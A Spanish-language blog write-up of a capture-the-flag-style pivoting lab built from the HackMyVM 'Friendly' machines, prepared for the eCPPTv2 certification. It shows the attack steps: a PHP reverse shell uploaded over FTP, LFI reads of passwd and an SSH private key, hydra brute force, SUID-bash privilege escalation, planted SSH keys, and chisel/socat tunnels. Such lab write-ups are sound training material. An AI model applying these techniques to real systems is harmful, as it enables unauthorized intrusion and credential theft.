---

title: eCPPTv2 Saga Friendly
date: 2023-10-01 07:03 +0800
categories: [Writeup]
tags: [LABs, hackmyvm, eCPPTv2, Certs]
pin: false

---

Este LAB esta orientado para practicar el pivoting de cara a la certificación `"eCPPTv2"`. Vamos a utilizar la saga de máquinas "Friendly" de la plataforma [Hackmyvm](https://hackmyvm.eu). Son máquinas fáciles y muy divertidas creadas por el usuario `Rijaba1`, os dejo su canal de [YouTube](https://www.youtube.com/@RiJaba1) y de [GitHub](https://github.com/RiJaba1) por si quereis apoyar sus proyectos.

<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/IntroSagaFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;"></figcaption>
</figure>

## <font color="#953734">Descarga de Máquinas</font>
- [Friendly](https://mega.nz/file/qgERkKxR#FVh6f9V40xu5N2w9JXy_-giQeyabliq3VVAyQY0kFBo)
- [Friendly2](https://mega.nz/file/XkMSDLZL#sFshjYvInLVkjJ_53HOmdfmcdiq52S2ikXM_kNXdNss)
- [Friendly3](https://mega.nz/file/qwMW2ZSK#5egiSr1nUcS7d_tY_KYZGhnk9A7gf7Kfo3jdXjyZKuQ)

## <font color="#953734">Configuración Máquinas</font>
- Las máquinas se descargan en `.zip`,las descomprimimos y hacemos doble click al `.ova` de cada máquina para importalas a VirtualBOX.
- Dentro de VirtualBOX en `tools/networks` configuramos las redes necesarias para el LAB.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/NetworksBOX.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Networks</figcaption>
</figure>
- Ahora vamos a asignar los adaptadores de red necesarios a cada máquina.
- En la máquina <font color="#de7802">Friendly</font> activamos dos adaptadores de red con `NAT VM` y `NAT VM1`, es importante cambiar el modo promiscuo en todas las máquinas a `Allow VMs` para poder tener conexión entre las máquinas virtuales.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/AdapterFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Interfaces Friendly</figcaption>
</figure>
- Máquina <font color="#de7802">Friendly2</font>, red `NAT VM1 y 2`:
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/AdapterFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Interfaces Friendly2</figcaption>
</figure>
- Máquina <font color="#de7802">Friendly3</font>, red `NAT VM2`:
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/AdapterFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Interfaces Friendly3</figcaption>
</figure>
## <font color="#953734">Network</font>
Esta tabla indica el nombre y cantidad de las interfaces de red a cada máquina.

| Máquina   | 1ª Interface | 2ª Interface |
| --------- | ------------ | ------------ |
| KALI      | NAT VM       |              |
| Friendly  | NAT VM       | NAT VM1      |
| Friendly2 | NAT VM1      | NAT VM2      |
| Friendly3 | NAT VM2      |              |

## <font color="#953734">Resources</font>
Recursos para enumerar y pivotar durante el LAB.
- [NetScan](https://github.com/r4mnx/Tools/blob/main/NetScan/NetScan.sh) es un script de reconocimiento de hosts y puertos.
- [Procmon](https://raw.githubusercontent.com/r4mnx/Tools/main/Procmon/procmon.sh) script para ver procesos en segundo plano en tiempo real.
- [Chisel](https://github.com/jpillora/chisel/releases/tag/v1.9.1)
- [Socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

## <font color="#953734">Explotación</font>
### <font color="#de7802">Friendly</font>
#### <font color="#fac08f">Enumeración</font>
- Hacemos un escaneo de Hosts en nuestra red con `arp-scan -I eth0 --localnet`, la máquina Friendly es la ip 192.168.100.5.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/arpFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">arp-scan Friendly</figcaption>
</figure>
- Enumeramos con `nmap` los puertos abiertos.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/nmapFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Nmap Friendly</figcaption>
</figure>
- Lanzamos una serie de sripts de `nmap` para descubrir versión y detalles de los servicios encontrados. 
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/nmapTargFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Nmap Puertos Friendly</figcaption>
</figure>
- Podemos acceder como `anonymous` sin proporcionar `pass`, no encontramos nada interesante, pero encontramos algo curioso, el `index.html` esta en el servicio `FTP`, podemos suponer que el directorio web está montado en el `FTP`.
- <u>Aplicamos fuzzing a la WEB:</u>
	- Fuzzing a directorios: `gobuster dir -u http://192.168.100.5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200` -> Sin éxito.
	- Fuzzing a subdirectorios: `gobuster vhost -u http://192.168.100.5 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200` -> Sin éxito.
- La WEB parece estar limpia, vamos a retomar la idea de entrar e intentar subir un archivo al servicio `FTP`, si realmente es el directorio raiz de la WEB podemos cargar un fichero malicioso y el servidor lo interpretará. 
#### <font color="#fac08f">Intrusión</font>
- Vamos a crear un `test.txt` y subirlo a FTP con `put`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/putFTPFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;"></figcaption>
</figure>
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/CurlPruebaFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Curl Prueba</figcaption>
</figure>
- El servidor interpreta los archivos, vamos a descargar y subir una revshell, yo en este caso voy a subir la típica de [PentesMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), existen otros recursos en [Revshells](https://www.revshells.com/),etc.

<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/wgetFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Wget PentesMonkey</figcaption>
</figure>
- Necesitamos cambiar la `IP` y `PORT` donde vamos a recibir la revshell. 
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/changeIPshellFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Change IP PORT</figcaption>
</figure>
- Dentro de FTP, realizamos un `put r4mnx.php`que es el archivo que contiene la revShell.
- Nos ponemos en escucha con `nc` en la máquina de ataque y lanzamos `curl` para activar la revshell al recurso `r4mnx.php`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/ncFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Escucha RevShell</figcaption>
</figure>
##### <font color="#245bdb">www-data</font>
- Ganamos acceso como `www-data`.
- Ejecutamos `sudo -l` y tenemos privilegios sudo del binario `vim`, vim tiene la característica de poder ejecutar comandos a nivel de sistema dentro de `vim`. 
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/sudoFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Sudo -l Friendly</figcaption>
</figure>
- Ejecutamos `sudo vim`, y dentro escribimos `:! /bin/bash` y automáticamente recibimos una Shell como `ROOT`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/vimFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Escalation Friendly</figcaption>
</figure>
- <font color="#e36c09">PWNED!</font>
##### <font color="#245bdb">ROOT</font>
- Ahora somos `root`, vamos a preparar la máquina para seguir avanzando en el LAB e ir descubriendo la siguiente máquina.
- <u>Vamos a instalar ssh y activarlo para acceder con mayor facilidad:</u>
	- `apt install openssh-server`
	- `systemctl enable ssh`
	- `systemctl status ssh`
- Una vez que ssh este habilitado en "Friendly" vamos a crear un fichero en `/root/.ssh/authorized_keys` para guardar nuestra id_rsa.pub de nuestra máquina de atacante.
- <u>Pasos:</u>
	- `mkdir /root/.ssh/ && touch /root/.ssh/authorized_keys` -> Máquina ataque
	- `ssh-keygen` -> Máquina ataque
	- Copiamos el contenido de `id_rsa.pub` de nuestra máquina al  fichero `authorized_keys` de la máquina "Friendly".
- Subida de archivos necesarios, vamos a descargar los archivos dentro de "Resources" y subierlos con `scp`:

```bash
$> scp -i ~/.ssh/id_rsa NetScan.sh root@192.168.100.5:/root/
$> scp -i ~/.ssh/id_rsa socat root@192.168.100.5:/root/
$> scp -i ~/.ssh/id_rsa chisel root@192.168.100.5:/root/
```
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/scpFriendly.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">SCP ficheros</figcaption>
</figure>
- Con `ip a` vemos que  la máquina Friendly tiene otra interface con la IP "10.0.2.6", vamos a usar NetScan.sh para descubrir hosts.
	- `./NetScan.sh -o 10.0.2.6/24` -> Descubrir nuevos hosts
	- `./NetScan.sh -p 10.0.2.5` -> Enumeración de puetos abiertos al nuevo host "Friendly2"
#### <font color="#fac08f">Pivoting</font>
- Vamos a levantar el servidor de `chisel` en nuestra máquina y el cliente en "Friendly" para poder alcanzar `Friendly2`.

```bash
$> sudo ./chisel server --reverse -p 10000 # Kali: Creamos SERVER CHISEL

$> ./chisel client 192.168.100.4:10000 R:10001:socks # Máquina Friendly
# IMPORTANTE: modificar el fichero /etc/proxychains.conf -> "strict_chains" & "socks5 127.0.0.1 10001"
```
### <font color="#de7802">Friendly2</font>

#### <font color="#fac08f">Enumeración</font>
- Enumeración de puertos con `Nmap`:
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/nmapFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Nmap Friendly2</figcaption>
</figure>
- Vamos a realizar Fuzzing con `Gobuster` a la WEB, en este caso no usaremos `proxychains` ya que gobuster tiene una flag específica para lanzar bajo un proxy:
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/gobusterFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Gobuster Friendly2</figcaption>
</figure>
#### <font color="#fac08f">Intrusión</font>
- Vamos a ver ese directorio WEB `/tools`, se puede hacer desde un navegador como firefox configurando el addon `FoxyProxy` por ejemplo o en mi caso me parece más comodo realizar las peticiones bajo `proxychains`y `curl`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/curlToolsFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;"></figcaption>
</figure>
- Analizando el código podemos ver que el recurso `check_if_exist.php` tiene una variable `doc` esta carga ficheros existentes del servidor WEB. Al cargar ficheros locales del servidor, podemos intentar escapar del directorio raiz del server WEB y cargar ficheros locales de la máquina, si es así estariamos ante un `LFI`.
  - `sudo proxychains curl "http://10.0.2.5/tools/check_if_exist.php?doc=keyboard.html"` -> vemos el recurso `keyboard.html`.
  - Vamos a realizar un [Path Traversal](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/file-inclusion/README.md) y llegar a ejecutar un `LFI (Local File Inclusión)`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/lfiFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">LFI Friendly2</figcaption>
</figure>
- Es vulnerable a `LFI`, encontramos un usuario `gh0st` en el `passwd`, vamos a ver otros ficheros sensibles del sistema como la `id_rsa` del usuario `gh0st`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/id_rsaFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">id_rsa Friendly2</figcaption>
</figure>
- Vamos a copiar la `id_rsa` en nuestra máquina y asignarle permisos 600 para intentar conectarnos por ssh. <u>Pasos:</u>
	- `echo "contenido id_rsa" > id_rsa` -> máquina de atacante.
	- `chmod 600 id_rsa` -> en la máquina de atacante.
- Nos conectamos por ssh:
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/sshFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">SSH Friendly2</figcaption>
</figure>
- Parece que la `id_rsa` está protegida por contraseña, podemos con `ssh2john` extraer un hash y con `john` intentar crackealo:
	- `ssh2john id_rsa > hash` -> extraemos el hash
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/johnFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">JOHN Friendly2</figcaption>
</figure>
- Ahora tenemos la pass `"celtic"` para poder usar la `id_rsa`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/sshgh0stFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Conexión SSH Friendly2</figcaption>
</figure>
##### <font color="#245bdb">gh0st</font>
- Accedemos a Friendly2 como `gh0st`, vamos a hacer `export TERM=xterm` y `export SHELL=bash` para tener mas  movilidad en la terminal.
- Lanzamos `sudo -l` y vemos que tenemos permisos para lanzar el script como root sin proporcionar contraseña. 
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/sudoFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Sudo -l Friendly2</figcaption>
</figure>
- `SETENV` nos permite modificar una variable de entorno durante la ejecución del comando unicamente. 
- `cat /opt/security.sh` vemos el codigo del script y ejecuta comandos con ruta relativa.
- En conclusión, si podemos ejecutar el script como root sin pass, modificar una variable de entorno y el script no usa rutas absolutas, podemos ejecutar un `"PATH Hijacking"`.
- Vamos a crear un archivo malicioso llamado `tr`,  modificaremos la variable `PATH` y así poder cargar nuestro `tr` malicioso.
	- `echo "chmod u+s /bin/bash" > tr` -> Creamos el fichero `tr` con un comando para cambiar `SUID` a la bash.
	- `chmod +x tr` -> otorgamos permisos de ejecución a `tr`.
- Ya está todo listo, vamos a ejecutar el siguiente comando para dar permisos `SUID` a la bash.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/exploitFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Elevation Friendly2</figcaption>
</figure>
- `bash -p` -> lanzamos una bash con máximos privilegios, al ser `SUID` nos convertiremos en `root`.
- <font color="#e36c09">PWNED!</font>
##### <font color="#245bdb">ROOT</font>
- Vamos hacer el mismo proceso de la máquina `"Friendly"`, copiamos nuestro `id_rsa.pub` en el `authorized_keys` de  `Friendly2` y subimos todos los archivos de Resources (NetScan.sh, socat y chisel) con `scp`:
	- `mkdir /root/.ssh` -> Ejecución en Friendly2
	- `echo "ContenidoID_RSA.pub" > authorized_keys` -> Friendly2

```bash
$> proxychains scp -i ~/.ssh/id_rsa NetScan.sh root@10.0.2.5:/root/
$> proxychains scp -i ~/.ssh/id_rsa socat root@10.0.2.5:/root/
$> proxychains scp -i ~/.ssh/id_rsa chisel root@10.0.2.5:/root/
```
- `ip a` -> en Friendly2 y descubrimos una nueva interface de red por lo tanto otro segmento de red a escanear.
- `./NetScan.sh -o 192.168.20.0/24` -> Escaneo de hosts.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/netscanFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">NetScan Hosts Friendly3</figcaption>
</figure>
- `./NetScan -p 192.168.20.7` -> Escaneo de Ports.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/netscanportFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">NetScan Ports Friendly3</figcaption>
</figure>
#### <font color="#fac08f">Pivoting</font>
- Para alcanzar Friendly3, tenemos que levantar otro cliente de `chisel` en Friendly2 y con `socat` redirecionar `chisel` a nuestra máquina de ataque.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/proxyFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Proxy Friendly3</figcaption>
</figure>

```bash
$> ./socat TCP-LISTEN:10100,fork TCP:192.168.100.4:10000 # Friendly escuchamos por el puerto 10100 y redirecionamos a nuestro Kali al puerto 10000 que es donde está chisel.
$> ./chisel client 10.0.2.6:10100 R:10002:socks # Friendly2, lanzamos al socat, en la interfaz más cercana, en este caso a la ip 10.0.2.6. 
```
- Debemos modificar `/etc/proxychains.conf` para añadir `socks5 127.0.0.1 10002`. 
- Comentar `# sctric_chain` y descomentar `# dynamic_chain`
- Añadir en este orden `socks5 127.0.0.1 10002`
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/proxychaindFriendly2.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Proxychains Friendly3</figcaption>
</figure>
### <font color="#de7802">Friendly3</font>
#### <font color="#fac08f">Enumeración</font>
- Escaneamos con `Nmap`:
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/nmapFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Nmap Friendly3</figcaption>
</figure>
- Lanzamos scripts de reconocimeinto de versión de servicios:
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/nmapPortsFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Nmap Ports Friendly3</figcaption>
</figure>
#### <font color="#fac08f">Intrusión</font>
- Vemos la WEB, y encontramos un nombre de usuario `"juan"` y nos indica que se han añadido nuevos recursos al servicio `FTP`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/curlFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Curl Friendly3</figcaption>
</figure>
- La WEB parece limpia, no tenemos acceso a FTP como `anonymous` , vamos a realizar con `hydra` fuerza bruta al servicio `FTP`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/hydraFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Hydra Friendly3</figcaption>
</figure>
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/ftpFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">FTP Friendly3</figcaption>
</figure>
- `FTP` tiene muchos archivos y directorios, vamos a descargarlos en nuestra máquina de forma recursiva para analizarlos mejor.
	- `proxychains -q wget -r ftp://juan:alexis@192.168.20.7` -> Después de analizar todos los archivos, es un RabbitHole.
- En este punto parece que no podemos avanzar en la máquina, pero siempre tenemos que contemplar la reutilización de contraseñas.
- Vamos a conectarnos por `ssh` con las credenciales `juan:alexis`
	- `sudo proxychains -q ssh -i ~/.ssh/id_rsa juan@192.168.20.7`
##### <font color="#245bdb">juan</font>
- Ganamos acceso a "Friendly3" como `juan`.
- Después de ejecutar comandos y no encontrar nada, vamos a ver si se está  ejecutando alguna tarea en segundo plano. 
- Antes de usar herramientas como [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)o [LSE](https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh), pruebo con un script sencillo como [Procmon](https://raw.githubusercontent.com/r4mnx/Tools/main/Procmon/procmon.sh).

- Descargamos [Procmon](https://raw.githubusercontent.com/r4mnx/Tools/main/Procmon/procmon.sh) le asignamos permisos de ejecución `chmod +x procmon.sh` y lo ejecutamos.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/procmonFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Procmon Friendly3</figcaption>
</figure>
- Se está ejecutando un script como `root`, vamos a investigarlo.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/appFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">App Friendly3</figcaption>
</figure>
- El script copia una bash (como root) en el directorio `/tmp/a.bash`, asigna una serie de permisos y luego borra el fichero.
- Vamos a crear una "OneLine" para que ejecute un comando antes de que `a.bash` sea borrada y así injectar permisos `SUID` a la bash.

```bash
$> while true; do echo "chmod u+s /bin/bash" > /tmp/a.bash && echo "Ok"; done # 
```
- Ahora la bash es `SUID`.
<figure style="text-align: center;">
  <img src="/assets/img/commons/Friendly/bashFriendly3.png" alt="SagaFriendly">
  <figcaption style="font-style: italic; font-size: smaller;">Escalation Friendly3</figcaption>
</figure>

- `bash -p` -> para elevar privilegios.
##### <font color="#245bdb">ROOT</font>
- <font color="#e36c09">PWNED!</font>
